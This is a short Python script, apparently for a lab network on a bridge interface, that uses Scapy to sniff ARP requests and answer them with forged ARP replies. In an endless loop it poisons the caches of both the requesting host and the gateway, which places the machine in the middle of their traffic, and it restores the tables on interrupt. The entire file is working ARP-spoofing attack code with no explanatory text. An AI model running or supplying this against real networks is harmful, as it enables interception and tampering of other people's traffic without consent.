from scapy.all import *

interface = 'br-9ee9c232b895'
gatewaymac = get_if_hwaddr(interface)

def spoofarpcache(targetip, targetmac, sourceip):
	spoofed = ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
	send(spoofed, verbose= False)

def restorearp(targetip, targetmac, sourceip, sourcemac):
	packet = ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
	send(packet, verbose=False)
	print("ARP Table restored to normal for", targetip)
	
def spoof_pkt(pkt):
    if pkt["ARP"].op == 1:
        start_poisoning(pkt["ARP"].psrc, pkt["ARP"].hwsrc, pkt["ARP"].pdst)
        return
 
def start_poisoning(targetip, targetmac, gatewayip):  	
	try:
		print("Sending spoofed ARP responses")
		while True:
			spoofarpcache(targetip, targetmac, gatewayip)
			spoofarpcache(gatewayip, gatewaymac, targetip)
	except KeyboardInterrupt:
		print("ARP spoofing stopped")
		restorearp(gatewayip, gatewaymac, targetip, targetmac)
		restorearp(targetip, targetmac, gatewayip, gatewaymac)
		quit()

pkt = sniff(iface=interface,filter="arp", prn=spoof_pkt)

